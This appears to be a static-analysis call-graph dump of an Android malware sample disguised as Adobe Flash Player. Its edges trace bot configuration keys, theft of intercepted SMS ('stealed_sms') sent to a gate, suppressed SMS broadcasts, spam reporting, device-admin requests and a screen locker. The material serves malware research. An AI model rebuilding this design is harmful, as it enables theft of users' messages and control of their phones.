VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke r3.<java.io.File: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String toString()>
VIRTUAL edge: $r2 = virtualinvoke $r0.<com.adobe.flashplayer_.AdobeZCore: android.os.IBinder onBind(android.content.Intent)>(null) in <dummyMainClass: com.adobe.flashplayer_.AdobeZCore dummyMainMethod_com_adobe_flashplayer___AdobeZCore(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeZCore: android.os.IBinder onBind(android.content.Intent)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.ADOBEcoreZa dummyMainMethod_com_adobe_flashplayer___ADOBEcoreZa(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.ADOBEcoreZa dummyMainMethod_com_adobe_flashplayer___ADOBEcoreZa(android.content.Intent)>
SPECIAL edge: specialinvoke r4.<java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>($r5) in <com.adobe.flashplayer_.FlashY: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("BCTMP_") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String[] split(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r15) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.Prefs: void stopSelf()>() in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <android.app.Service: void stopSelf()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: $r11 = specialinvoke r0.<com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotNetwork", $r1) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Exception: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>("BotID", r6) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r6) in <com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
SPECIAL edge: specialinvoke $r55.<java.lang.StringBuffer: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(":Executed:HTTP") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<com.adobe.flashplayer_.MacrosStat$1: void <init>(com.adobe.flashplayer_.MacrosStat,long,long)>(r0, 180000L, 180000L) in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <com.adobe.flashplayer_.MacrosStat$1: void <init>(com.adobe.flashplayer_.MacrosStat,long,long)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("Title: ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.SystemSWF dummyMainMethod_com_adobe_flashplayer___SystemSWF(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.SystemSWF dummyMainMethod_com_adobe_flashplayer___SystemSWF(android.content.Intent)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=stealed_sms&i=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer_.ADOBEcoreZa: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.ADOBEcoreZa: void onEnabled(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.ADOBEcoreZa: android.content.Intent getIntent()>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
STATIC edge: staticinvoke <java.lang.System: void exit(int)>(0) in <com.adobe.flashplayer.Certificate$1: void onClick(android.view.View)> ==> <java.lang.System: void exit(int)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" [ Sent Messages ] \r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r11, $r18, $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $z0 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: boolean isOnline()>() in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: boolean isOnline()>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r5 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("c", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $z0 = virtualinvoke $r0.<com.adobe.flashplayer.Certificate: boolean onKeyDown(int,android.view.KeyEvent)>(0, null) in <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)> ==> <com.adobe.flashplayer.Certificate: boolean onKeyDown(int,android.view.KeyEvent)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r5.<android.content.Intent: void <init>(java.lang.String)>("android.settings.SETTINGS") in <com.adobe.flashplayer_.ADOBEcoreZa: java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent)> ==> <android.content.Intent: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void onAttachedToWindow()>() in <com.adobe.packages.ZLocker: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void onAttachedToWindow()>
VIRTUAL edge: $r12 = virtualinvoke $r12.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("+", "") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r59.<com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)>($r7, "OFF") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)>(null, null) in <dummyMainClass: com.adobe.flashplayer_.adobeCore dummyMainMethod_com_adobe_flashplayer___adobeCore(android.content.Intent)> ==> <com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r7 = staticinvoke <android.telephony.SmsMessage: android.telephony.SmsMessage createFromPdu(byte[])>($r15) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.telephony.SmsMessage: android.telephony.SmsMessage createFromPdu(byte[])>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer_.adobeCore: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.adobeCore: android.content.Intent getIntent()>
SPECIAL edge: specialinvoke r3.<java.io.BufferedReader: void <init>(java.io.Reader)>(r4) in <com.adobe.flashplayer.Certificate: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
SPECIAL edge: r4 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
SPECIAL edge: specialinvoke $r55.<java.lang.StringBuffer: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: void <init>()>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void <init>()>() in <com.adobe.flashplayer.Certificate: void <init>()> ==> <android.app.Activity: void <init>()>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.ADOBEcoreZa: void onEnabled(android.content.Context,android.content.Intent)>(null, null) in <dummyMainClass: com.adobe.flashplayer_.ADOBEcoreZa dummyMainMethod_com_adobe_flashplayer___ADOBEcoreZa(android.content.Intent)> ==> <com.adobe.flashplayer_.ADOBEcoreZa: void onEnabled(android.content.Context,android.content.Intent)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r1) in <com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.Writer: void write(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("3gOn") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.flashplayer.Certificate: android.view.Window getWindow()>() in <com.adobe.flashplayer.Certificate: void onAttachedToWindow()> ==> <android.app.Activity: android.view.Window getWindow()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r9, $r18, "sentSpam:Executed", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.String: boolean contains(java.lang.CharSequence)>("de") in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r1 = virtualinvoke r3.<java.io.File: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r25 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r0 = staticinvoke <java.util.Calendar: java.util.Calendar getInstance()>() in <com.adobe.flashplayer_.FlashURL: java.lang.String millisToDate(long)> ==> <java.util.Calendar: java.util.Calendar getInstance()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r6) in <com.adobe.flashplayer.Certificate: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.FlashW dummyMainMethod_com_adobe_flashplayer___FlashW(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
STATIC edge: $r41 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>(0) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
VIRTUAL edge: r3 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>($r5) in <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r1.<android.content.Intent: android.content.Intent putExtra(java.lang.String,android.os.Parcelable)>("android.app.extra.DEVICE_ADMIN", $r4) in <com.adobe.flashplayer_.FlashARM: void onActivityResult(int,int,android.content.Intent)> ==> <android.content.Intent: android.content.Intent putExtra(java.lang.String,android.os.Parcelable)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.Prefs$navW: void <init>(com.adobe.flashplayer_.Prefs)>($r1) in <com.adobe.flashplayer_.Prefs$navW: void <init>(com.adobe.flashplayer_.Prefs,com.adobe.flashplayer_.Prefs$navW)> ==> <com.adobe.flashplayer_.Prefs$navW: void <init>(com.adobe.flashplayer_.Prefs)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=macros_a_bad&i=macros_a_data") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Service: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void <init>()> ==> <android.app.Service: void <init>()>
SPECIAL edge: r4 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: r34 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r15.<com.adobe.flashplayer_.FlashVars: android.os.AsyncTask execute(java.lang.Object[])>($r16) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.adobeCore: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<android.content.Intent: void <init>(android.content.Context,java.lang.Class)>(r0, class "Lcom/adobe/flashplayer_/AdobeZCore;") in <com.adobe.flashplayer_.FlashARM: void onActivityResult(int,int,android.content.Intent)> ==> <android.content.Intent: void <init>(android.content.Context,java.lang.Class)>
VIRTUAL edge: $i0 = virtualinvoke $r21.<java.lang.String: int indexOf(java.lang.String)>("On") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n\n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r22 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotVer", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.FlashZ: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.FlashZ dummyMainMethod_com_adobe_flashplayer___FlashZ(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: void <init>()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r15.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r16) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $z1 = virtualinvoke $r21.<java.lang.String: boolean contains(java.lang.CharSequence)>("A") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
SPECIAL edge: specialinvoke r5.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_SMSGate", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void abortBroadcast()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: void abortBroadcast()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r1 = specialinvoke $r0.<com.adobe.flashplayer.Certificate: java.lang.String readConfig(java.lang.String,android.content.Context)>($r1, $r2) in <com.adobe.flashplayer.Certificate: java.lang.String access$0(com.adobe.flashplayer.Certificate,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer.Certificate: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r9) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r21 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r20 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.AdobeZCore dummyMainMethod_com_adobe_flashplayer___AdobeZCore(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.AdobeZCore dummyMainMethod_com_adobe_flashplayer___AdobeZCore(android.content.Intent)>
